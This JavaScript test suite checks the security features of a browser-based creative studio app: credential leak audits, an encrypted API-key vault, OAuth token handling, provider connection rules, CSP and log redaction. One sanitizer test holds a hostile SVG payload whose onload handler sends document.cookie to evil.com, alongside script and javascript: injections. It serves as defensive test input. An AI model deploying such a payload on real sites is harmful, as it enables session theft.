/**
 * AnyConverter Creative Studio — Phase 08 Verification Suite
 * Tests for Browser-Only Auth, BYOK Credentials, Vault & Security Controls
 */

const assert = require('assert');
const { AuthProvider, GOOGLE_DRIVE_FILE_SCOPE } = require('../../../assets/js/creative-studio/auth-provider.js');
const { BYOKVault, VAULT_VERSION } = require('../../../assets/js/creative-studio/byok-vault.js');
const {
  CONNECTION_VERDICT,
  ProviderSecurity,
  AuditLogger
} = require('../../../assets/js/creative-studio/provider-security.js');

async function runPhase08Tests() {
  console.log('================================================================');
  console.log('  ANYCONVERTER CREATIVE STUDIO — PHASE 08 VERIFICATION SUITE   ');
  console.log('================================================================\n');

  let passed = 0;
  const total = 7;

  // ---------------------------------------------------------------------------
  // TEST 1: Raw Secret Leak Audit Across Payloads & Bundles
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T1: Raw Secret Leak Audit (Telemetry, Dumps & Bundles)... ');

    const sampleCleanPayload = {
      projectTitle: 'Explainer Video',
      durationSeconds: 120,
      scenes: [{ id: 's1', prompt: 'Cinematic corporate intro' }]
    };
    assert.strictEqual(BYOKVault.auditForPlaintextLeaking(sampleCleanPayload), true);

    const sampleLeakedOpenAi = {
      projectTitle: 'Leaked Project',
      apiKey: 'sk-abcdef123456789012345678901234'
    };
    assert.strictEqual(BYOKVault.auditForPlaintextLeaking(sampleLeakedOpenAi), false);

    const sampleLeakedGoogle = {
      key: 'AIzaSyD-1234567890abcdefghijklmnopqrstuv'
    };
    assert.strictEqual(BYOKVault.auditForPlaintextLeaking(sampleLeakedGoogle), false);

    const sampleLeakedHf = {
      token: 'hf_abcdef1234567890123456789012345678'
    };
    assert.strictEqual(BYOKVault.auditForPlaintextLeaking(sampleLeakedHf), false);

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 2: GIS Browser Token Model & Drive Authorization Lifecycle
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T2: GIS Browser Token Model & Memory-Only Token Lifecycle... ');

    const auth = new AuthProvider({ clientId: 'mock-client-id.apps.googleusercontent.com' });
    assert.strictEqual(auth.isAuthorized(), false);
    assert.strictEqual(auth.getAccessToken(), null);

    // Mock authorized token injection with drive.file scope
    const mockToken = 'ya29.a0AfH6SMB_mock_short_lived_access_token_12345';
    await auth.authorizeDrive({
      _mockToken: mockToken,
      expiresIn: 3600,
      userEmail: 'creator@anyconverter.io'
    });

    assert.strictEqual(auth.isAuthorized(), true);
    assert.strictEqual(auth.getAccessToken(), mockToken);

    // Verify active account masked indicator
    const account = auth.getActiveAccount();
    assert.strictEqual(account.authorized, true);
    assert.strictEqual(account.email, 'c***r@anyconverter.io');
    assert.ok(account.expiresInSeconds > 3500);

    // Revocation zeroes in-memory state
    await auth.revoke();
    assert.strictEqual(auth.isAuthorized(), false);
    assert.strictEqual(auth.getAccessToken(), null);
    assert.strictEqual(auth.getActiveAccount().email, null);

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 3: Opt-in Local PBKDF2/AES-256-GCM Encrypted Vault
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T3: Opt-in Local PBKDF2/AES-256-GCM Vault & Wrong Passphrase Rejection... ');

    const vault = new BYOKVault();
    const providerId = 'google-gemini';
    const rawApiKey = 'AIzaSyD-sample_mock_api_key_for_gemini_models_123';
    const correctPassphrase = 'MyMasterSecretPassword2026!';
    const wrongPassphrase = 'IncorrectPasswordTryAgain!';

    // Encrypt into File 08 compliant record
    const record = await vault.encryptCredential(providerId, rawApiKey, correctPassphrase);
    assert.strictEqual(record.providerId, 'google-gemini');
    assert.strictEqual(record.recordVersion, VAULT_VERSION);
    assert.strictEqual(record.kdf, 'PBKDF2-SHA256');
    assert.strictEqual(record.cipher, 'AES-256-GCM');
    assert.strictEqual(record.iterations, 100000);
    assert.ok(record.saltB64 && record.saltB64.length > 10);
    assert.ok(record.ivB64 && record.ivB64.length > 10);
    assert.ok(record.ciphertextB64 && record.ciphertextB64.length > 10);

    // Assert that raw key is NOT present in record
    assert.strictEqual(JSON.stringify(record).includes(rawApiKey), false);

    // Decrypt with correct passphrase
    const decrypted = await vault.decryptCredential(record, correctPassphrase);
    assert.strictEqual(decrypted, rawApiKey);

    // Attempt decrypt with wrong passphrase -> must throw with zero leak
    let caughtError = null;
    try {
      await vault.decryptCredential(record, wrongPassphrase);
    } catch (err) {
      caughtError = err;
    }
    assert.ok(caughtError !== null, 'Wrong passphrase should throw error');
    assert.strictEqual(caughtError.code, 'INVALID_PASSPHRASE');

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 4: Provider Connection Decision Tree
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T4: Provider Decision Tree (Direct Browser vs Manual vs Proxy Rejection)... ');

    // 1. Google Gemini (Supported direct browser client)
    const geminiEval = ProviderSecurity.evaluateProvider('google-gemini');
    assert.strictEqual(geminiEval.verdict, CONNECTION_VERDICT.DIRECT_BROWSER_SUPPORTED);

    // 2. Hugging Face (Supported direct client)
    const hfEval = ProviderSecurity.evaluateProvider('huggingface-inference');
    assert.strictEqual(hfEval.verdict, CONNECTION_VERDICT.DIRECT_BROWSER_SUPPORTED);

    // 3. OpenAI (Server secret required / manual notebook only)
    const openaiEval = ProviderSecurity.evaluateProvider('openai');
    assert.strictEqual(openaiEval.verdict, CONNECTION_VERDICT.MANUAL_NOTEBOOK_ONLY);

    // 4. Runway (Confidential API lacking CORS -> manual notebook only)
    const runwayEval = ProviderSecurity.evaluateProvider('runway');
    assert.strictEqual(runwayEval.verdict, CONNECTION_VERDICT.MANUAL_NOTEBOOK_ONLY);

    // 5. Attempted Third-Party CORS Proxy -> REJECTED_UNSAFE
    const proxyEval = ProviderSecurity.evaluateProvider('openai', {
      usesThirdPartyProxy: true,
      proxyUrl: 'https://cors-anywhere.herokuapp.com/'
    });
    assert.strictEqual(proxyEval.verdict, CONNECTION_VERDICT.REJECTED_UNSAFE);

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 5: Ephemeral Session-Only BYOK Vault
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T5: In-Memory BYOK Session Vault Lifecycle & Instant Zeroization... ');

    const vault = new BYOKVault();
    const token = 'test-session-secret-key-999';

    vault.setSessionKey('gemini', token);
    assert.strictEqual(vault.hasSessionKey('gemini'), true);
    assert.strictEqual(vault.getSessionKey('gemini'), token);

    vault.removeSessionKey('gemini');
    assert.strictEqual(vault.hasSessionKey('gemini'), false);
    assert.strictEqual(vault.getSessionKey('gemini'), null);

    vault.setSessionKey('hf', 'hf_key_123');
    vault.setSessionKey('gemini', 'gem_key_456');
    vault.clearSession();
    assert.strictEqual(vault.hasSessionKey('hf'), false);
    assert.strictEqual(vault.hasSessionKey('gemini'), false);

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 6: CSP Specification & Untrusted Input Sanitization
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T6: CSP Specification & Untrusted Input Sanitization... ');

    const csp = ProviderSecurity.getStudioCSP();
    assert.ok(csp.includes("default-src 'self'"));
    assert.ok(!csp.includes("'unsafe-eval'")); // Explicitly banned
    assert.ok(!csp.includes("connect-src *"));  // Blanket wildcard banned
    assert.ok(csp.includes("https://generativelanguage.googleapis.com"));

    // Hostile SVG / Script sanitization
    const hostileInput = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert("XSS stolen keys");</script>
        <circle cx="50" cy="50" r="40" onload="fetch('https://evil.com?c=' + document.cookie)" />
        <a href="javascript:alert('malicious')">Click me</a>
      </svg>
    `;

    const sanitized = ProviderSecurity.sanitizeUntrustedInput(hostileInput);
    assert.strictEqual(sanitized.includes('<script>'), false);
    assert.strictEqual(sanitized.includes('onload='), false);
    assert.strictEqual(sanitized.includes('javascript:'), false);
    assert.ok(sanitized.includes('<circle cx="50" cy="50" r="40"'));

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // TEST 7: Audit Logger Secret Scrubbing & Masking
  // ---------------------------------------------------------------------------
  try {
    process.stdout.write('[TEST] T7: Audit Logger Secret Scrubbing & Redaction... ');

    const logger = new AuditLogger();
    logger.log('PROVIDER_INIT', {
      provider: 'google-gemini',
      apiKey: 'AIzaSyD-1234567890abcdefghijklmnopqrstuv',
      customSecret: 'sk-abcdef123456789012345678901234',
      userQuery: 'Generate shot 1 with token hf_12345678901234567890123456789012'
    });

    const entries = logger.getEntries();
    assert.strictEqual(entries.length, 1);
    const loggedStr = JSON.stringify(entries[0]);

    // Verify zero plaintext secrets appear in logged string
    assert.strictEqual(loggedStr.includes('AIzaSyD-1234567890abcdefghijklmnopqrstuv'), false);
    assert.strictEqual(loggedStr.includes('sk-abcdef123456789012345678901234'), false);
    assert.strictEqual(loggedStr.includes('hf_12345678901234567890123456789012'), false);
    assert.ok(loggedStr.includes('[REDACTED_CREDENTIAL]') || loggedStr.includes('[REDACTED_GOOGLE_KEY]'));

    console.log('PASS');
    passed++;
  } catch (err) {
    console.log('FAIL');
    console.error(err);
  }

  // ---------------------------------------------------------------------------
  // SUMMARY
  // ---------------------------------------------------------------------------
  console.log('\n================================================================');
  console.log(`PHASE 08 SUMMARY: ${passed}/${total} Tests Passed (${total - passed} Failures).`);
  if (passed === total) {
    console.log('STATUS: ALL PHASE 08 VERIFICATION CRITERIA PASS.');
    console.log('================================================================\n');
    return true;
  } else {
    console.log('STATUS: FAILURES DETECTED IN PHASE 08.');
    console.log('================================================================\n');
    process.exit(1);
  }
}

if (require.main === module) {
  runPhase08Tests().catch(err => {
    console.error('Fatal error running Phase 08 tests:', err);
    process.exit(1);
  });
}

module.exports = { runPhase08Tests };
